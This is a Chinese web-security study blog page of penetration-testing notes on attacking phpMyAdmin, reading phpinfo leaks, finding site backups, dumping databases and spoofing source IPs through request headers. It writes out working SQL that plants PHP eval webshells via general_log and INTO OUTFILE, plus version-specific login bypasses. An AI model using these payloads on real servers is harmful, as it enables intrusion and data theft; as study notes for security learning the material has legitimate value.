@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Pisces","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="基于PHPMyadmin的攻击入口寻找 目录扫描（linux大小写敏感，字典里需要区分） CMS特性 google hacking 网站自带功能  口令爆破 github上有爆破工具  远程代码执行等漏洞利用后台bypass（万能密码） phpmyadmin2.11.3-2.11.4  用户名填入‘localhost’@‘@”不用密码可以直接登录 phpmyadmin2.11.9.2  存在空口令">
+<meta property="og:type" content="article">
+<meta property="og:title" content="实战相关">
+<meta property="og:url" content="http://yoursite.com/2020/03/01/%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/index.html">
+<meta property="og:site_name" content="学习笔记">
+<meta property="og:description" content="基于PHPMyadmin的攻击入口寻找 目录扫描（linux大小写敏感，字典里需要区分） CMS特性 google hacking 网站自带功能  口令爆破 github上有爆破工具  远程代码执行等漏洞利用后台bypass（万能密码） phpmyadmin2.11.3-2.11.4  用户名填入‘localhost’@‘@”不用密码可以直接登录 phpmyadmin2.11.9.2  存在空口令">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-03-01T02:39:29.000Z">
+<meta property="article:modified_time" content="2020-03-05T05:57:23.060Z">
+<meta property="article:author" content="nannanshen">
+<meta property="article:tag" content="getshell">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://yoursite.com/2020/03/01/%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>实战相关 | 学习笔记</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">学习笔记</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">从零开始学习web安全</p>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/01/%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpg">
+      <meta itemprop="name" content="nannanshen">
+      <meta itemprop="description" content="渗透测试">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="学习笔记">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          实战相关
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-03-01 10:39:29" itemprop="dateCreated datePublished" datetime="2020-03-01T10:39:29+08:00">2020-03-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-03-05 13:57:23" itemprop="dateModified" datetime="2020-03-05T13:57:23+08:00">2020-03-05</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="基于PHPMyadmin的攻击"><a href="#基于PHPMyadmin的攻击" class="headerlink" title="基于PHPMyadmin的攻击"></a>基于PHPMyadmin的攻击</h1><h2 id="入口寻找"><a href="#入口寻找" class="headerlink" title="入口寻找"></a>入口寻找</h2><ol>
+<li>目录扫描（linux大小写敏感，字典里需要区分）</li>
+<li>CMS特性</li>
+<li>google hacking</li>
+<li>网站自带功能</li>
+</ol>
+<h2 id="口令爆破"><a href="#口令爆破" class="headerlink" title="口令爆破"></a>口令爆破</h2><ul>
+<li>github上有爆破工具</li>
+</ul>
+<h2 id="远程代码执行等漏洞利用"><a href="#远程代码执行等漏洞利用" class="headerlink" title="远程代码执行等漏洞利用"></a>远程代码执行等漏洞利用</h2><h2 id="后台bypass（万能密码）"><a href="#后台bypass（万能密码）" class="headerlink" title="后台bypass（万能密码）"></a>后台bypass（万能密码）</h2><ul>
+<li>phpmyadmin2.11.3-2.11.4  用户名填入‘localhost’@‘@”不用密码可以直接登录</li>
+<li>phpmyadmin2.11.9.2  存在空口令，直接root登录不用密码。</li>
+</ul>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><ol>
+<li><p>物理路径获取</p>
+<ul>
+<li>各种报错</li>
+<li>google hacking ：Site:xxx.edu.tw warning、Site:xxx.com.tw “atal error”</li>
+<li>默认路径</li>
+<li>读取解析器配置文件  select @@basedir</li>
+<li>旁站</li>
+<li>各种信息泄露</li>
+</ul>
+</li>
+<li><p>通过日志拿shell</p>
+<ul>
+<li><p>set global general_log=’on’ //首先设置为on</p>
+<p>set global general_log_file =”E:\wamp\wamp\www\3.php”  //设置日志路径</p>
+<p>select “<?php eval($_POST['mima'])?>“;   //一句话写入</p>
+</li>
+</ul>
+</li>
+<li><p>导出拿shell</p>
+<ul>
+<li><p>SELECT “<?php phpinfo();?>“ INTO OUTFILE “E:\wamp\wamp\www\2.php”</p>
+</li>
+<li><p>SELECT “<?php phpinfo();?>“ INTO dumpFILE “E:\wamp\wamp\www\2.php”</p>
+</li>
+<li><p>创建表导出：</p>
+<p>CREATE TABLE a (cmd text NOT NULL);<br>INSERT INTO a (cmd) VALUES(‘<?php eval($_POST[1]);?>‘);<br>select cmd from a into outfile ‘D:/phpMyAdmin/libraries/d.php’;<br>DROP TABLE IF EXISTS a;</p>
+</li>
+<li><p>猥琐型导出：</p>
+<p>select * from admin where userid=1 into outfile “x:\wwwroot\sx.php” LINES STARTING BY<br>0x3C3F70687020706870696E666F28293F3E%23。写完语句最好用url编码一下</p>
+</li>
+</ul>
+</li>
+</ol>
+<h1 id="phpinfo页面信息"><a href="#phpinfo页面信息" class="headerlink" title="phpinfo页面信息"></a>phpinfo页面信息</h1><h2 id="能获取到的信息"><a href="#能获取到的信息" class="headerlink" title="能获取到的信息"></a>能获取到的信息</h2><ul>
+<li><p>操作系统：System</p>
+</li>
+<li><p>物理路径：_ENV[“SCRIPT_FILENAME”]</p>
+</li>
+<li><p>真实IP：_SERVER[“SERVER_ADDR”]</p>
+</li>
+<li><p>Web服务器版本：_SERVER[“SERVER_SOFTWARE”]</p>
+</li>
+<li><p>远程包含：allow_url_include</p>
+</li>
+<li><p>被禁函数：disable_functions</p>
+<p><a href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html" target="_blank" rel="noopener">https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html</a></p>
+</li>
+</ul>
+<h2 id="拓展渗透"><a href="#拓展渗透" class="headerlink" title="拓展渗透"></a>拓展渗透</h2><ul>
+<li><p>server api</p>
+</li>
+<li><p>phpinfo-lfi</p>
+<p><a href="https://www.freebuf.com/articles/web/79830.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/79830.html</a></p>
+<p><a href="https://seaii-blog.com/index.php/2017/10/25/73.html" target="_blank" rel="noopener">https://seaii-blog.com/index.php/2017/10/25/73.html</a></p>
+</li>
+</ul>
+<h1 id="网站备份"><a href="#网站备份" class="headerlink" title="网站备份"></a>网站备份</h1><h2 id="获取"><a href="#获取" class="headerlink" title="获取"></a>获取</h2><ul>
+<li>目录扫描（7kbscan）<ul>
+<li>backup.rar</li>
+<li>back.zip</li>
+</ul>
+</li>
+<li>网站备份扫描器</li>
+<li>其他漏洞<ul>
+<li>目录遍历</li>
+</ul>
+</li>
+</ul>
+<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><ul>
+<li>获取源码进行代码审计（注入，上传，越权）</li>
+<li>寻找配置文件尝试连接数据库</li>
+<li>寻找后台尝试弱口令</li>
+<li>查找各种敏感文件（说明文件，密码问题…）</li>
+<li>别人留下的shell（webshell查杀工具）</li>
+</ul>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/6817" target="_blank" rel="noopener">https://xz.aliyun.com/t/6817</a></p>
+<h1 id="拖库"><a href="#拖库" class="headerlink" title="拖库"></a>拖库</h1><h2 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h2><ul>
+<li>大批量数据导出会执行很多请求</li>
+<li>盲注效率很低</li>
+</ul>
+<h2 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h2><p>–dump    –start    –stop</p>
+<h2 id="K8飞刀"><a href="#K8飞刀" class="headerlink" title="K8飞刀"></a>K8飞刀</h2><h2 id="Burp的intruder模块"><a href="#Burp的intruder模块" class="headerlink" title="Burp的intruder模块"></a>Burp的intruder模块</h2><h2 id="拖库webshell"><a href="#拖库webshell" class="headerlink" title="拖库webshell"></a>拖库webshell</h2><ul>
+<li>phpspy　<a href="https://www.webshell.cc/4422.html" target="_blank" rel="noopener">https://www.webshell.cc/4422.html</a></li>
+<li>adminer　<a href="https://www.adminer.org/" target="_blank" rel="noopener">https://www.adminer.org/</a></li>
+</ul>
+<h2 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h2><ul>
+<li>navicat premium  <a href="https://segmentfault.com/a/1190000015957785" target="_blank" rel="noopener">https://segmentfault.com/a/1190000015957785</a></li>
+<li>文件占用   强制复制windows⽂件</li>
+<li>命令压缩：mackecab \ rar \7z   <a href="https://blog.csdn.net/cosmoslife/article/details/8499773" target="_blank" rel="noopener">https://blog.csdn.net/cosmoslife/article/details/8499773</a></li>
+</ul>
+<h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><ul>
+<li>mysqldump</li>
+<li>phpmyadmin</li>
+<li>navicat premium</li>
+</ul>
+<h2 id="oracle"><a href="#oracle" class="headerlink" title="oracle"></a>oracle</h2><ul>
+<li>navicat premium     <a href="http://www.sqltools.net" target="_blank" rel="noopener">www.sqltools.net</a></li>
+</ul>
+<h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a href="http://musec.lofter.com/post/303379_a98d0d5" target="_blank" rel="noopener">http://musec.lofter.com/post/303379_a98d0d5</a></li>
+<li><a href="https://www.t00ls.net/articles-24256.html" target="_blank" rel="noopener">https://www.t00ls.net/articles-24256.html</a></li>
+</ul>
+<h1 id="HTTP请求源IP伪造"><a href="#HTTP请求源IP伪造" class="headerlink" title="HTTP请求源IP伪造"></a>HTTP请求源IP伪造</h1><ul>
+<li>有些目标站点配置了只允许特定IP访问，但目标验证源IP不够严苛的情况下，可以通过伪造IP来达到访问某些web应用的目的。利用前提是目标站点判断IP是通过请求头获取的。</li>
+</ul>
+<h2 id="出现点"><a href="#出现点" class="headerlink" title="出现点"></a>出现点</h2><ul>
+<li>网站管理后台</li>
+</ul>
+<h2 id="伪造方法"><a href="#伪造方法" class="headerlink" title="伪造方法"></a>伪造方法</h2><ul>
+<li>在HTTP请求包中加入特定请求头和值</li>
+</ul>
+<p>X-Forwarded-For: 192.168.0.91<br>X-Originating-IP: 192.168.0.92<br>X-Remote-IP: 192.168.0.93<br>X-Remote-Addr: 192.168.0.94<br>X-Client-IP: 192.168.0.95</p>
+<h2 id="可利用工具"><a href="#可利用工具" class="headerlink" title="可利用工具"></a>可利用工具</h2><ul>
+<li>burp</li>
+<li>插件</li>
+</ul>
+<h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><ul>
+<li>不知道确切IP的时候，可以通过轮询的方法。已知网站是某个地区的，可以先找出该地区的IP段，用IP段中的IP一个个尝试。</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/getshell/" rel="tag"># getshell</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/02/27/windows%E6%8F%90%E6%9D%83%E4%B9%8BUAC%E7%BB%95%E8%BF%87/" rel="prev" title="windows提权之UAC绕过">
+      <i class="fa fa-chevron-left"></i> windows提权之UAC绕过
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#基于PHPMyadmin的攻击"><span class="nav-number">1.</span> <span class="nav-text">基于PHPMyadmin的攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#入口寻找"><span class="nav-number">1.1.</span> <span class="nav-text">入口寻找</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#口令爆破"><span class="nav-number">1.2.</span> <span class="nav-text">口令爆破</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#远程代码执行等漏洞利用"><span class="nav-number">1.3.</span> <span class="nav-text">远程代码执行等漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#后台bypass（万能密码）"><span class="nav-number">1.4.</span> <span class="nav-text">后台bypass（万能密码）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#getshell"><span class="nav-number">1.5.</span> <span class="nav-text">getshell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#phpinfo页面信息"><span class="nav-number">2.</span> <span class="nav-text">phpinfo页面信息</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#能获取到的信息"><span class="nav-number">2.1.</span> <span class="nav-text">能获取到的信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#拓展渗透"><span class="nav-number">2.2.</span> <span class="nav-text">拓展渗透</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#网站备份"><span class="nav-number">3.</span> <span class="nav-text">网站备份</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#获取"><span class="nav-number">3.1.</span> <span class="nav-text">获取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方法"><span class="nav-number">3.2.</span> <span class="nav-text">利用方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">3.3.</span> <span class="nav-text">参考</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#拖库"><span class="nav-number">4.</span> <span class="nav-text">拖库</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#注入点"><span class="nav-number">4.1.</span> <span class="nav-text">注入点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQLMAP"><span class="nav-number">4.2.</span> <span class="nav-text">SQLMAP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#K8飞刀"><span class="nav-number">4.3.</span> <span class="nav-text">K8飞刀</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Burp的intruder模块"><span class="nav-number">4.4.</span> <span class="nav-text">Burp的intruder模块</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#拖库webshell"><span class="nav-number">4.5.</span> <span class="nav-text">拖库webshell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mssql"><span class="nav-number">4.6.</span> <span class="nav-text">mssql</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql"><span class="nav-number">4.7.</span> <span class="nav-text">mysql</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#oracle"><span class="nav-number">4.8.</span> <span class="nav-text">oracle</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考-1"><span class="nav-number">4.9.</span> <span class="nav-text">参考</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#HTTP请求源IP伪造"><span class="nav-number">5.</span> <span class="nav-text">HTTP请求源IP伪造</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#出现点"><span class="nav-number">5.1.</span> <span class="nav-text">出现点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#伪造方法"><span class="nav-number">5.2.</span> <span class="nav-text">伪造方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#可利用工具"><span class="nav-number">5.3.</span> <span class="nav-text">可利用工具</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#拓展"><span class="nav-number">5.4.</span> <span class="nav-text">拓展</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="nannanshen"
+      src="/images/touxiang.jpg">
+  <p class="site-author-name" itemprop="name">nannanshen</p>
+  <div class="site-description" itemprop="description">渗透测试</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/nannanshen" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;nannanshen" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      友情链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.dark5.net/" title="https:&#x2F;&#x2F;www.dark5.net&#x2F;" rel="noopener" target="_blank">dark5</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">nannanshen</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v4.2.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.7.1
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
+<!-- 页面点击小红心 ,和看板娘冲突了。-->
+<!--<script type="text/javascript" src="/js/src/clicklove.js"></script>-->
+<!-- 看板娘 -->
+<script src="/live2d-widget/autoload.js"></script>
